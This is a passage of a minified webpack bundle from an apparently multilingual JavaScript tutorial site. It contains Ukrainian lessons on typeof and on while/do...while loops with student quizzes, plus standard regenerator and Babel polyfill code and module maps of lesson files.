1**◘◘\n\n→→→ typeof 2e-200 | 'number', 'string', 'boolean', 'undefined' | number →→→\n\n◘◘** 2**◘◘\n\n→→→ typeof NaN | 'number', 'string', 'boolean', 'undefined' | number →→→\n\n◘◘** 3**◘◘\n\n→→→ typeof 'Infinity' | 'number', 'string', 'boolean', 'undefined' | string →→→\n\n◘◘** 4**◘◘\n\n→→→ typeof 5 > 8 | 'number', 'string', 'boolean', 'undefined' | boolean →→→\n\n◘◘** 5**◘◘\n\n→→→ typeof undefined | 'number', 'string', 'boolean', 'undefined' | undefined →→→\n\n__________________________________________________\n\n## [![ico-25 icon] Специфікація ECMAScript](https://tc39.es/ecma262/multipage/ecmascript-data-types-and-values.html )\n\nСучасна специфікація мови визначає сім типів даних:\n\n• **Boolean**\n• **Null**\n• **Undefined**\n• **Number**\n• **String**\n• **Symbol**\n• **Object**\n\nОператор **~typeof~** працює «по-старому», оскільки якби принцип його роботи було змінено, то багато сайтів, створених до 2015 року, просто посипалися б.\nОднак використовуючи його, варто пам'ятати про його «недосконалість».\n\nПід час порівняння типів даних двох змінних враховуйте, що символи розташовані в кодувальній таблиці в алфавітному порядку, тому під час порівняння більшим буде той,\nякий розташований далі від початку таблиці.\n"},62718:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Цикли while | do...while\n\nДуже часто число ітерацій циклу заздалегідь невідоме, і воно залежить від виконання якоїсь умови.\nЯк в армійській приказці, «копати від паркану і до обіду».\n\nТому ми не можемо використовувати лічильник ітерацій, оскільки не можемо встановити обмеження на його значення.\n\nУ цьому випадку ми використовуємо один з операторів циклу **~while~** або **~do...while~**.\n\n## ![ico-30 icon] while\n\nСинтаксично оператор **~while~** містить три обов'язкові частини: саме слово **~while~**, потім (через пробіл) круглі дужки, у яких буде записано логічний вираз (умову циклу), а потім (через пробіл) - тіло циклу, укладене у фігурні дужки:\n\n~~~js\nwhile (умова) {\n  ...тіло циклу\n}\n~~~\n\nЩо робитиме движок, зіткнувшись із таким виразом?\n\n1. Спочатку він обчислить значення логічного виразу в круглих дужках і приведе його до логічного типу.\n2. Якщо умова виконана (тобто обчислене значення буде ~true~), то виконується код всередині фігурних дужок (чергова ітерація циклу).\nПісля чого движок повернеться до пункту 1.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nvar n = 5\n\nwhile (n < 5) {\n  console.log(n)\n}\n~~~\n\n^^Цей цикл не буде виконано жодного разу, оскільки умову ~n < 5~ не виконано від початку, тобто під час обчислення виразу в круглих дужках буде отримано значення ~false~.^^\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nvar res = 0, n = 1\n\nwhile (n) {\n  n = prompt('Enter the number')\n  res += (n - 0) || 0\n}\n~~~\n\n^^Цикл підсумовуватиме введені юзером числа доти, доки в модальному вікні ~prompt~ не буде натиснута кнопка ~Cancel~.^^\n^^Оскільки в модальному вікні введені значення будуть рядкового типу, ми приводимо їх до числа за допомогою віднімання ~(n - 0)~.^^\n^^Якщо в результаті віднімання ~(n - 0)~ буде отримано значення ~NaN~, то до змінної ~res~ буде додано 0.^^.\n\nУ наступному прикладі ми скористаємося функцією **~random~** бібліотеки **~Math~**, яка генерує псевдовипадкове число від 0 до 1:\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nvar res = 0, n = 0\n\nwhile (n < 0.5) {\n  n = Math.random()\n  res += n\n}\n~~~\n\nОчевидно, що цей цикл не буде нескінченним, оскільки рано чи пізно значення **~Math.random()~** виявиться більшим за 0.5.\n\n______________________\n\n## ![ico-30 icon] do...while\n\nЦей цикл спочатку виконує код у фігурних дужках, а потім перевіряє виконання умови.\n\n~~~js\ndo {\n  ...\n} while (умова)\n~~~\n\n^^Цикл буде виконано щонайменше 1 раз, оскільки перевірка істинності умови відбувається після чергової ітерації циклу.^^\n\nКоли цей цикл кращий за попередній?\nНаприклад, у такому випадку:\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\ndo {\n  var rand = Math.random()\n  console.log(rand)\n} while (rand < .5)\n~~~\n\n______________________________________________________\n\n## ![ico-30 icon] Tests\n\n◘◘![ico-25 hw]** 1**◘◘\n~~~js\ndo {\n  var rand = Math.random()\n  if (rand > .5) break\n} while (true)\n~~~\n\n→→→ Чи буде цикл нескінченним? | 'yes', 'no' | no→→→\n\n◘◘![ico-25 hw]** 2**◘◘\n~~~js\nvar num = 1\n\nwhile (Math.random() < .5) {\n  num *= (num + 1)\n}\n~~~\n\n→→→ Чи буде цикл нескінченним? | 'yes', 'no' | no→→→\n\n◘◘![ico-25 hw]** 3**◘◘\n~~~js\nvar num = prompt('Enter the integer') - 0\nvar res = 0\n\nwhile (true) {\n  num >= 2 && res++\n  num /= 2\n  if (num < 2) {\n    console.log(`2 ** ${res} = ${2 ** res}`)\n    break\n  }\n}\n~~~\n\n→→→ Що буде в консолі, якщо в модальному вікні ввести 8? | '', '2 ** 1 = 2', '2 ** 2 = 4', '2 ** 3 = 8', '2 ** 4 = 16' | 2 ** 3 = 8→→→\n\n◘◘![ico-25 hw]** 4**◘◘\n~~~js\nvar num = prompt('Enter the integer') - 0\nvar res = 1\n\nwhile (true) {\n  res *= num--\n  if (num < 2) {\n    console.log(`Factorial: ${res}`)\n    break\n  }\n}\n~~~\n\n→→→ Що буде в консолі, якщо в модальному вікні ввести 5? | 24, 0, 120, 20 | 120→→→\n\n________________\n\n[![ico-30 hw] **Quiz**](quiz/while)\n"},7452:n=>{var e=function(n){"use strict";var e,_=Object.prototype,t=_.hasOwnProperty,o=Object.defineProperty||function(n,e,_){n[e]=_.value},r="function"==typeof Symbol?Symbol:{},s=r.iterator||"@@iterator",a=r.asyncIterator||"@@asyncIterator",i=r.toStringTag||"@@toStringTag";function c(n,e,_){return Object.defineProperty(n,e,{value:_,enumerable:!0,configurable:!0,writable:!0}),n[e]}try{c({},"")}catch(n){c=function(n,e,_){return n[e]=_}}function l(n,e,_,t){var r=e&&e.prototype instanceof f?e:f,s=Object.create(r.prototype),a=new P(t||[]);return o(s,"_invoke",{value:E(n,_,a)}),s}function u(n,e,_){try{return{type:"normal",arg:n.call(e,_)}}catch(n){return{type:"throw",arg:n}}}n.wrap=l;var m="suspendedStart",d="suspendedYield",p="executing",h="completed",g={};function f(){}function y(){}function b(){}var w={};c(w,s,(function(){return this}));var v=Object.getPrototypeOf,j=v&&v(v(O([])));j&&j!==_&&t.call(j,s)&&(w=j);var x=b.prototype=f.prototype=Object.create(w);function S(n){["next","throw","return"].forEach((function(e){c(n,e,(function(n){return this._invoke(e,n)}))}))}function k(n,e){function _(o,r,s,a){var i=u(n[o],n,r);if("throw"!==i.type){var c=i.arg,l=c.value;return l&&"object"==typeof l&&t.call(l,"__await")?e.resolve(l.__await).then((function(n){_("next",n,s,a)}),(function(n){_("throw",n,s,a)})):e.resolve(l).then((function(n){c.value=n,s(c)}),(function(n){return _("throw",n,s,a)}))}a(i.arg)}var r;o(this,"_invoke",{value:function(n,t){function o(){return new e((function(e,o){_(n,t,e,o)}))}return r=r?r.then(o,o):o()}})}function E(n,e,_){var t=m;return function(o,r){if(t===p)throw new Error("Generator is already running");if(t===h){if("throw"===o)throw r;return N()}for(_.method=o,_.arg=r;;){var s=_.delegate;if(s){var a=A(s,_);if(a){if(a===g)continue;return a}}if("next"===_.method)_.sent=_._sent=_.arg;else if("throw"===_.method){if(t===m)throw t=h,_.arg;_.dispatchException(_.arg)}else"return"===_.method&&_.abrupt("return",_.arg);t=p;var i=u(n,e,_);if("normal"===i.type){if(t=_.done?h:d,i.arg===g)continue;return{value:i.arg,done:_.done}}"throw"===i.type&&(t=h,_.method="throw",_.arg=i.arg)}}}function A(n,_){var t=_.method,o=n.iterator[t];if(o===e)return _.delegate=null,"throw"===t&&n.iterator.return&&(_.method="return",_.arg=e,A(n,_),"throw"===_.method)||"return"!==t&&(_.method="throw",_.arg=new TypeError("The iterator does not provide a '"+t+"' method")),g;var r=u(o,n.iterator,_.arg);if("throw"===r.type)return _.method="throw",_.arg=r.arg,_.delegate=null,g;var s=r.arg;return s?s.done?(_[n.resultName]=s.value,_.next=n.nextLoc,"return"!==_.method&&(_.method="next",_.arg=e),_.delegate=null,g):s:(_.method="throw",_.arg=new TypeError("iterator result is not an object"),_.delegate=null,g)}function T(n){var e={tryLoc:n[0]};1 in n&&(e.catchLoc=n[1]),2 in n&&(e.finallyLoc=n[2],e.afterLoc=n[3]),this.tryEntries.push(e)}function I(n){var e=n.completion||{};e.type="normal",delete e.arg,n.completion=e}function P(n){this.tryEntries=[{tryLoc:"root"}],n.forEach(T,this),this.reset(!0)}function O(n){if(n){var _=n[s];if(_)return _.call(n);if("function"==typeof n.next)return n;if(!isNaN(n.length)){var o=-1,r=function _(){for(;++o<n.length;)if(t.call(n,o))return _.value=n[o],_.done=!1,_;return _.value=e,_.done=!0,_};return r.next=r}}return{next:N}}function N(){return{value:e,done:!0}}return y.prototype=b,o(x,"constructor",{value:b,configurable:!0}),o(b,"constructor",{value:y,configurable:!0}),y.displayName=c(b,i,"GeneratorFunction"),n.isGeneratorFunction=function(n){var e="function"==typeof n&&n.constructor;return!!e&&(e===y||"GeneratorFunction"===(e.displayName||e.name))},n.mark=function(n){return Object.setPrototypeOf?Object.setPrototypeOf(n,b):(n.__proto__=b,c(n,i,"GeneratorFunction")),n.prototype=Object.create(x),n},n.awrap=function(n){return{__await:n}},S(k.prototype),c(k.prototype,a,(function(){return this})),n.AsyncIterator=k,n.async=function(e,_,t,o,r){void 0===r&&(r=Promise);var s=new k(l(e,_,t,o),r);return n.isGeneratorFunction(_)?s:s.next().then((function(n){return n.done?n.value:s.next()}))},S(x),c(x,i,"Generator"),c(x,s,(function(){return this})),c(x,"toString",(function(){return"[object Generator]"})),n.keys=function(n){var e=Object(n),_=[];for(var t in e)_.push(t);return _.reverse(),function n(){for(;_.length;){var t=_.pop();if(t in e)return n.value=t,n.done=!1,n}return n.done=!0,n}},n.values=O,P.prototype={constructor:P,reset:function(n){if(this.prev=0,this.next=0,this.sent=this._sent=e,this.done=!1,this.delegate=null,this.method="next",this.arg=e,this.tryEntries.forEach(I),!n)for(var _ in this)"t"===_.charAt(0)&&t.call(this,_)&&!isNaN(+_.slice(1))&&(this[_]=e)},stop:function(){this.done=!0;var n=this.tryEntries[0].completion;if("throw"===n.type)throw n.arg;return this.rval},dispatchException:function(n){if(this.done)throw n;var _=this;function o(t,o){return a.type="throw",a.arg=n,_.next=t,o&&(_.method="next",_.arg=e),!!o}for(var r=this.tryEntries.length-1;r>=0;--r){var s=this.tryEntries[r],a=s.completion;if("root"===s.tryLoc)return o("end");if(s.tryLoc<=this.prev){var i=t.call(s,"catchLoc"),c=t.call(s,"finallyLoc");if(i&&c){if(this.prev<s.catchLoc)return o(s.catchLoc,!0);if(this.prev<s.finallyLoc)return o(s.finallyLoc)}else if(i){if(this.prev<s.catchLoc)return o(s.catchLoc,!0)}else{if(!c)throw new Error("try statement without catch or finally");if(this.prev<s.finallyLoc)return o(s.finallyLoc)}}}},abrupt:function(n,e){for(var _=this.tryEntries.length-1;_>=0;--_){var o=this.tryEntries[_];if(o.tryLoc<=this.prev&&t.call(o,"finallyLoc")&&this.prev<o.finallyLoc){var r=o;break}}r&&("break"===n||"continue"===n)&&r.tryLoc<=e&&e<=r.finallyLoc&&(r=null);var s=r?r.completion:{};return s.type=n,s.arg=e,r?(this.method="next",this.next=r.finallyLoc,g):this.complete(s)},complete:function(n,e){if("throw"===n.type)throw n.arg;return"break"===n.type||"continue"===n.type?this.next=n.arg:"return"===n.type?(this.rval=this.arg=n.arg,this.method="return",this.next="end"):"normal"===n.type&&e&&(this.next=e),g},finish:function(n){for(var e=this.tryEntries.length-1;e>=0;--e){var _=this.tryEntries[e];if(_.finallyLoc===n)return this.complete(_.completion,_.afterLoc),I(_),g}},catch:function(n){for(var e=this.tryEntries.length-1;e>=0;--e){var _=this.tryEntries[e];if(_.tryLoc===n){var t=_.completion;if("throw"===t.type){var o=t.arg;I(_)}return o}}throw new Error("illegal catch attempt")},delegateYield:function(n,_,t){return this.delegate={iterator:O(n),resultName:_,nextLoc:t},"next"===this.method&&(this.arg=e),g}},n}(n.exports);try{regeneratorRuntime=e}catch(n){"object"==typeof globalThis?globalThis.regeneratorRuntime=e:Function("r","regeneratorRuntime = r")(e)}},60569:(n,e,_)=>{var t={"./":37953,"./index":37953,"./index.js":37953,"./keywords":82057,"./keywords.js":82057,"./mainMenu":9139,"./mainMenu.js":9139};function o(n){var e=r(n);return _(e)}function r(n){if(!_.o(t,n)){var e=new Error("Cannot find module '"+n+"'");throw e.code="MODULE_NOT_FOUND",e}return t[n]}o.keys=function(){return Object.keys(t)},o.resolve=r,n.exports=o,o.id=60569},44829:(n,e,_)=>{var t={"./":82627,"./eng":70563,"./eng.js":70563,"./index":82627,"./index.js":82627,"./pages":34127,"./pages.js":34127,"./ru":68426,"./ru.js":68426,"./translations":75775,"./translations.js":75775,"./ua":59845,"./ua.js":59845};function o(n){var e=r(n);return _(e)}function r(n){if(!_.o(t,n)){var e=new Error("Cannot find module '"+n+"'");throw e.code="MODULE_NOT_FOUND",e}return t[n]}o.keys=function(){return Object.keys(t)},o.resolve=r,n.exports=o,o.id=44829},1130:(n,e,_)=>{var t={"./":57246,"./engChars":16829,"./engChars.js":16829,"./index":57246,"./index.js":57246,"./ruChars":73512,"./ruChars.js":73512,"./translate":45220,"./translate.js":45220,"./uaChars":48429,"./uaChars.js":48429};function o(n){var e=r(n);return _(e)}function r(n){if(!_.o(t,n)){var e=new Error("Cannot find module '"+n+"'");throw e.code="MODULE_NOT_FOUND",e}return t[n]}o.keys=function(){return Object.keys(t)},o.resolve=r,n.exports=o,o.id=1130},90131:(n,e,_)=>{var t={"./":44577,"./getKeywords":38045,"./getKeywords.js":38045,"./getLesson":82133,"./getLesson.js":82133,"./getMainMenu":97655,"./getMainMenu.js":97655,"./index":44577,"./index.js":44577,"./parseHeaders":10194,"./parseHeaders.js":10194,"./search":46293,"./search.js":46293};function o(n){var e=r(n);return _(e)}function r(n){if(!_.o(t,n)){var e=new Error("Cannot find module '"+n+"'");throw e.code="MODULE_NOT_FOUND",e}return t[n]}o.keys=function(){return Object.keys(t)},o.resolve=r,n.exports=o,o.id=90131},78137:(n,e,_)=>{var t={"./404.md":33708,"./Array-iterating-methods.md":28718,"./eng/404.md":60347,"./eng/API.md":19499,"./eng/Array-iterating-methods-theory.md":9343,"./eng/Array-iterating-methods.md":64497,"./eng/Block-diagram.md":54326,"./eng/Boolean.md":43511,"./eng/Chrome-dev-tools.md":51049,"./eng/Event-Loop.md":56542,"./eng/JSON.md":49893,"./eng/Timers.md":6081,"./eng/arrayBuffer.md":76852,"./eng/arrow-function.md":56807,"./eng/async-await.md":61900,"./eng/data-structures.md":13918,"./eng/dynamic-import.md":6170,"./eng/for.md":12908,"./eng/function.md":32123,"./eng/pattern-Observer.md":2332,"./eng/pattern-Strategy.md":28703,"./eng/promise.md":53986,"./eng/start-page.md":29083,"./eng/var.md":40710,"./eng/while.md":51534,"./ru/404.md":6912,"./ru/API.md":44496,"./ru/Array-iterating-methods-theory.md":83898,"./ru/Array-iterating-methods.md":45842,"./ru/Array-methods.md":29242,"./ru/Assignments.md":8014,"./ru/BOM-postMessage.md":8046,"./ru/BOM.md":81342,"./ru/BigInt.md":15185,"./ru/Block-diagram.md":8485,"./ru/Boolean.md":53912,"./ru/CORS.md":29787,"./ru/Chrome-dev-tools.md":75032,"./ru/Classes.md":80040,"./ru/Closure.md":36345,"./ru/Conditional-operators.md":63268,"./ru/Content-Type.md":99510,"./ru/Context.md":57203,"./ru/DOM-MutationObserver-eng.md":83785,"./ru/DOM-MutationObserver.md":25140,"./ru/DOM-elements.md":69452,"./ru/DOM-events-eng.md":33441,"./ru/DOM-events.md":87244,"./ru/DOM.md":68512,"./ru/Date-constructor.md":73087,"./ru/Destructuring.md":5511,"./ru/Developer-tools.md":29372,"./ru/ECMA.md":74424,"./ru/Error.md":9502,"./ru/Event-Loop.md":90715,"./ru/Explicit-type-conversion.md":67556,"./ru/File-API.md":41101,"./ru/FileReader.md":46559,"./ru/Final-project.md":98152,"./ru/FormData.md":4480,"./ru/Implicit-type-conversion.md":97903,"./ru/Increment.md":34949,"./ru/IndexedDB-index.md":17310,"./ru/IndexedDB-store.md":38695,"./ru/IndexedDB-transaction.md":13398,"./ru/IndexedDB.md":6043,"./ru/JS-heap-memory-allocation.md":38105,"./ru/JSON-placeholder.md":74912,"./ru/JSON.md":83896,"./ru/Map.md":76014,"./ru/NaN-null-Infinity.md":72404,"./ru/NoSQL.md":43833,"./ru/NotificationAPI.md":99177,"./ru/Object-static-props.md":30791,"./ru/Proxy.md":77804,"./ru/REST-status.md":11371,"./ru/REST.md":12916,"./ru/SHA.md":50574,"./ru/SOLID.md":81503,"./ru/Set.md":30848,"./ru/Shadow-DOM.md":77455,"./ru/String-fromCharCode.md":55245,"./ru/String-methods.md":90428,"./ru/Symbol.md":89030,"./ru/Timers.md":25088,"./ru/UTF-8.md":12288,"./ru/XMLHttpRequest.md":76608,"./ru/arrayBuffer.md":32547,"./ru/arrow-function.md":22346,"./ru/async-await.md":27331,"./ru/async-constructor.md":98121,"./ru/async-is-good-eng.md":78990,"./ru/async-is-good.md":39143,"./ru/async-vs-Promise-all.md":99544,"./ru/call-apply-bind-currying.md":74349,"./ru/call-apply-bind.md":41655,"./ru/computed-prop-names.md":88434,"./ru/cookie.md":2676,"./ru/curl.md":68360,"./ru/custom-elements.md":56471,"./ru/data-structures.md":94397,"./ru/default-param-values.md":66044,"./ru/dynamic-import.md":87799,"./ru/fabric.md":47267,"./ru/fake-chat.md":44182,"./ru/fetch-API.md":60949,"./ru/for-of-for-in.md":76587,"./ru/for.md":84607,"./ru/forms.md":25943,"./ru/function-object-eng.md":90485,"./ru/function-object.md":38576,"./ru/function.md":98606,"./ru/generators-arg.md":40445,"./ru/generators-async.md":93477,"./ru/generators-yield.md":53924,"./ru/generators.md":51656,"./ru/get-and-set.md":17817,"./ru/git-bash.md":90163,"./ru/git.md":98144,"./ru/hw-02.md":53274,"./ru/hw-03.md":53497,"./ru/hw-04.md":59968,"./ru/hw-05.md":99399,"./ru/hw-06.md":4238,"./ru/hw-07.md":11629,"./ru/hw-08.md":57972,"./ru/hw-09.md":22571,"./ru/hw-10.md":40873,"./ru/hw-11.md":39786,"./ru/hw-12.md":28355,"./ru/hw-13.md":64780,"./ru/hw-14.md":47357,"./ru/hw-15.md":91870,"./ru/hw-16.md":79927,"./ru/hw-17.md":8176,"./ru/hw-18.md":35713,"./ru/hw-flowchart.md":42806,"./ru/in-operator.md":9426,"./ru/inheritance-model.md":30836,"./ru/json-server.md":19042,"./ru/let-const.md":95687,"./ru/life-cycle-hooks.md":22574,"./ru/literals.md":29806,"./ru/localStorage.md":65554,"./ru/localhost.md":69057,"./ru/methods.md":61774,"./ru/named-item.md":49937,"./ru/native-and-host-objects.md":67493,"./ru/not-defined.md":20233,"./ru/npm.md":10509,"./ru/pattern-Decorator.md":42738,"./ru/pattern-Observer.md":46641,"./ru/pattern-Strategy.md":67294,"./ru/patterns.md":48869,"./ru/performance.md":47642,"./ru/practice-03.md":74409,"./ru/practice-with-XSS.md":96171,"./ru/promise-constructor.md":18484,"./ru/promise.md":83018,"./ru/readableStream.md":74158,"./ru/recursion.md":94056,"./ru/scroll.md":14315,"./ru/self-work-02.md":77951,"./ru/short-method-syntax.md":576,"./ru/shorthand-object-literal.md":66721,"./ru/slots.md":37657,"./ru/start-page.md":25306,"./ru/strict-mode.md":11911,"./ru/switch.md":2734,"./ru/tcp-ip.md":55925,"./ru/template.md":69624,"./ru/throttling-and-debouncing.md":67902,"./ru/typeof.md":93039,"./ru/value-of.md":22459,"./ru/var.md":11109,"./ru/web-component-samples.md":30322,"./ru/web-socket.md":84486,"./ru/web-soket.md":60193,"./ru/web-workers.md":62644,"./ru/webpack-css-loaders.md":72416,"./ru/webpack-es-modules.md":94336,"./ru/webpack-exercise-6.md":95885,"./ru/webpack-exercise-7.md":94382,"./ru/webpack-exercise-8.md":47403,"./ru/webpack-mode.md":11447,"./ru/webpack-package-json.md":55981,"./ru/webpack.md":28079,"./ru/when-defined.md":938,"./ru/while.md":64649,"./ua/404.md":85195,"./ua/API.md":91163,"./ua/Array-iterating-methods-theory.md":27343,"./ua/Array-iterating-methods.md":54049,"./ua/Block-diagram.md":2598,"./ua/Boolean.md":93895,"./ua/Chrome-dev-tools.md":46745,"./ua/Event-Loop.md":82542,"./ua/JSON.md":49045,"./ua/Timers.md":53873,"./ua/arrayBuffer.md":57636,"./ua/arrow-function.md":93495,"./ua/async-await.md":4540,"./ua/data-structures.md":81486,"./ua/dynamic-import.md":50794,"./ua/for.md":6236,"./ua/function.md":54571,"./ua/pattern-Observer.md":60588,"./ua/pattern-Strategy.md":63023,"./ua/promise.md":92562,"./ua/start-page.md":32331,"./ua/var.md":90646,"./ua/while.md":62718};function o(n){var e=r(n);return _(e)}function r(n){if(!_.o(t,n)){var e=new Error("Cannot find module '"+n+"'");throw e.code="MODULE_NOT_FOUND",e}return t[n]}o.keys=function(){return Object.keys(t)},o.resolve=r,n.exports=o,o.id=78137},3674:(n,e,_)=>{var t={"./eng/404.md":60347,"./ru/404.md":6912,"./ua/404.md":85195};function o(n){var e=r(n);return _(e)}function r(n){if(!_.o(t,n)){var e=new Error("Cannot find module '"+n+"'");throw e.code="MODULE_NOT_FOUND",e}return t[n]}o.keys=function(){return Object.keys(t)},o.resolve=r,n.exports=o,o.id=3674}},e={};function _(t){var o=e[t];if(void 0!==o)return o.exports;var r=e[t]={exports:{}};return n[t](r,r.exports,_),r.exports}_.d=(n,e)=>{for(var t in e)_.o(e,t)&&!_.o(n,t)&&Object.defineProperty(n,t,{enumerable:!0,get:e[t]})},_.o=(n,e)=>Object.prototype.hasOwnProperty.call(n,e),_.r=n=>{"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(n,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(n,"__esModule",{value:!0})},(()=>{"use strict";_(24572);var n,e=(n=_(34328))&&n.__esModule?n:{default:n};e.default._babelPolyfill&&"undefined"!=typeof console&&console.warn&&console.warn("@babel/polyfill is loaded more than once on this page. This is probably not desirable/intended and may have consequences if different versions of the polyfills are applied sequentially. If you do need to load the polyfill more than once, use @babel/polyfill/noConflict instead to bypass the warning."),e.default._babelPolyfill=!0})(),(()=>{function n(e){return n="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},n(e)}function e(){"use strict";e=function(){return t};var _,t={},o=Object.prototype,r=o.hasOwnProperty,s=Object.defineProperty||function(n,e,_){n[e]=_.value},a="function"==typeof Symbol?Symbol:{},i=a.iterator||"@@iterator",c=a.asyncIterator||"@@asyncIterator",l=a.toStringTag||"@@toStringTag";function u(n,e,_){return Object.defineProperty(n,e,{value:_,enumerable:!0,configurable:!0,writable:!0}),n[e]}try{u({},"")}catch(_){u=function(n,e,_){return n[e]=_}}function m(n,e,_,t){var o=e&&e.prototype instanceof b?e:b,r=Object.create(o.prototype),a=new N(t||[]);return s(r,"_invoke",{value:T(n,_,a)}),r}function d(n,e,_){try{return{type:"normal",arg:n.call(e,_)}}catch(n){return{type:"throw",arg:n}}}t.wrap=m;var p="suspendedStart",h="suspendedYield",g="executing",f="completed",y={};function b(){}function w(){}function v(){}var j={};u(j,i,(function(){return this}));var x=Object.getPrototypeOf,S=x&&x(x(M([])));S&&S!==o&&r.call(S,i)&&(j=S);var k=v.prototype=b.prototype=Object.create(j);function E(n){["next","throw","return"].forEach((function(e){u(n,e,(function(n){return this._invoke(e,n)}))}))}function A(e,_){function t(o,s,a,i){var c=d(e[o],e,s);if("throw"!==c.type){var l=c.arg,u=l.value;return u&&"object"==n(u)&&r.call(u,"__await")?_.resolve(u.__await).then((function(n){t("next",n,a,i)}),(function(n){t("throw",n,a,i)})):_.resolve(u).then((function(n){l.value=n,a(l)}),(function(n){return t("throw",n,a,i)}))}i(c.arg)}var o;s(this,"_invoke",{value:function(n,e){function r(){return new _((function(_,o){t(n,e,_,o)}))}return o=o?o.then(r,r):r()}})}function T(n,e,t){var o=p;return function(r,s){if(o===g)throw Error("Generator is already running");if(o===f){if("throw"===r)throw s;return{value:_,done:!0}}for(t.method=r,t.arg=s;;){var a=t.delegate;if(a){var i=I(a,t);if(i){if(i===y)continue;return i}}if("next"===t.method)t.sent=t._sent=t.arg;else if("throw"===t.method){if(o===p)throw o=f,t.arg;t.dispatchException(t.arg)}else"return"===t.method&&t.abrupt("return",t.arg);o=g;var c=d(n,e,t);if("normal"===c.type){if(o=t.done?f:h,c.arg===y)continue;return{value:c.arg,done:t.done}}"throw"===c.type&&(o=f,t.method="throw",t.arg=c.arg)}}}function I(n,e){var t=e.method,o=n.iterator[t];if(o===_)return e.delegate=null,"throw"===t&&n.iterator.return&&(e.method="return",e.arg=_,I(n,e),"throw"===e.method)||"return"!==t&&(e.method="throw",e.arg=new TypeError("The iterator does not provide a '"+t+"' method")),y;var r=d(o,n.iterator,e.arg);if("throw"===r.type)return e.method="throw",e.arg=r.arg,e.delegate=null,y;var s=r.arg;return s?s.done?(e[n.resultName]=s.value,e.next=n.nextLoc,"return"!==e.method&&(e.method="next",e.arg=_),e.delegate=null,y):s:(e.method="throw",e.arg=new TypeError("iterator result is not an object"),e.delegate=null,y)}function P(n){var e={tryLoc:n[0]};1 in n&&(e.catchLoc=n[1]),2 in n&&(e.finallyLoc=n[2],e.afterLoc=n[3]),this.tryEntries.push(e)}function O(n){var e=n.completion||{};e.type="normal",delete e.arg,n.completion=e}function N(n){this.tryEntries=[{tryLoc:"root"}],n.forEach(P,this),this.reset(!0)}function M(e){if(e||""===e){var t=e[i];if(t)return t.call(e);if("function"==typeof e.next)return e;if(!isNaN(e.length)){var o=-1,s=function n(){for(;++o<e.length;)if(r.call(e,o))return n.value=e[o],n.done=!1,n;return n.value=_,n.done=!0,n};return s.next=s}}throw new TypeError(n(e)+" is not iterable")}return w.prototype=v,s(k,"constructor",{value:v,configurable:!0}),s(v,"constructor",{value:w,configurable:!0}),w.displayName=u(v,l,"GeneratorFunction"),t.isGeneratorFunction=function(n){var e="function"==typeof n&&n.constructor;return!!e&&(e===w||"GeneratorFunction"===(e.displayName||e.name))},t.mark=function(n){return Object.setPrototypeOf?Object.setPrototypeOf(n,v):(n.__proto__=v,u(n,l,"GeneratorFunction")),n.prototype=Object.create(k),n},t.awrap=function(n){return{__await:n}},E(A.prototype),u(A.prototype,c,(function(){return this})),t.AsyncIterator=A,t.async=function(n,e,_,o,r){void 0===r&&(r=Promise);var s=new A(m(n,e,_,o),r);return t.isGeneratorFunction(e)?s:s.next().then((function(n){return n.done?n.value:s.next()}))},E(k),u(k,l,"Generator"),u(k,i,(function(){return this})),u(k,"toString",(function(){return"[object Generator]"})),t.keys=function(n){var e=Object(n),_=[];for(var t in e)_.push(t);return _.reverse(),function n(){for(;_.length;){var t=_.pop();if(t in e)return n.value=t,n.done=!1,n}return n.done=!0,n}},t.values=M,N.prototype={constructor:N,reset:function(n){if(this.prev=0,this.next=0,this.sent=this._sent=_,this.done=!1,this.delegate=null,this.method="next",this.arg=_,this.tryEntries.forEach(O),!n)for(var e in this)"t"===e.charAt(0)&&r.call(this,e)&&!isNaN(+e.slice(1))&&(this[e]=_)},stop:function(){this.done=!0;var n=this.tryEntries[0].completion;if("throw"===n.type)throw n.arg;return this.rval},dispatchException:function(n){if(this.done)throw n;var e=this;function t(t,o){return a.type="throw",a.arg=n,e.next=t,o&&(e.method="next",e.arg=_),!!o}for(var o=this.tryEntries.length-1;o>=0;--o){var s=this.tryEntries[o],a=s.completion;if("root"===s.tryLoc)return t("end");if(s.tryLoc<=this.prev){var i=r.call(s,"catchLoc"),c=r.call(s,"finallyLoc");if(i&&c){if(this.prev<s.catchLoc)return t(s.catchLoc,!0);if(this.prev<s.finallyLoc)return t(s.finallyLoc)}else if(i){if(this.prev<s.catchLoc)return t(s.catchLoc,!0)}else{if(!c)throw Error("try statement without catch or finally");if(this.prev<s.finallyLoc)return t(s.finallyLoc)}}}},abrupt:function(n,e){for(var _=this.tryEntries.length-1;_>=0;--_){var t=this.tryEntries[_];if(t.tryLoc<=this.prev&&r.call(t,"finallyLoc")&&this.prev<t.finallyLoc){var o=t;break}}o&&("break"===n||"continue"===n)&&o.tryLoc<=e&&e<=o.finallyLoc&&(o=null);var s=o?o.completion:{};return s.type=n,s.arg=e,o?(this.method="next",this.next=o.finallyLoc,y):this.complete(s)},complete:function(n,e){if("throw"===n.type)throw n.arg;return"break"===n.type||"continue"===n.type?this.next=n.arg:"return"===n.type?(this.rval=this.arg=n.arg,this.method="return",this.next="end"):"normal"===n.type&&e&&(this.next=e),y},finish:function(n){for(var e=this.tryEntries.length-1;e>=0;--e){var _=this.tryEntries[e];if(_.finallyLoc===n)return this.complete(_.completion,_.afterLoc),O(_),y}},catch:function(n){for(var e=this.tryEntries.length-1;e>=0;--e){var _=this.tryEntries[e];if(_.tryLoc===n){var t=_.completion;if("throw"===t.type){var o=t.arg;O(_)}return o}}throw Error("illegal catch attempt")},delegateYield:function(n,e,t){return this.delegate={iterator:M(n),resultName:e,nextLoc:t},"next"===this.method&&(this.arg=_),y}},t}function t(n,e,_,t,o,r,s){try{var a=n[r](s),i=a.value}catch(n){return void _(n)}a.done?e(i):Promise.resolve(i).then(t,o)}var o=_(44577).default,r=o.getMainMenu,s=o.getKeywords,a=o.getLesson,i=o.parseHeaders,c=o.search;function l(){var 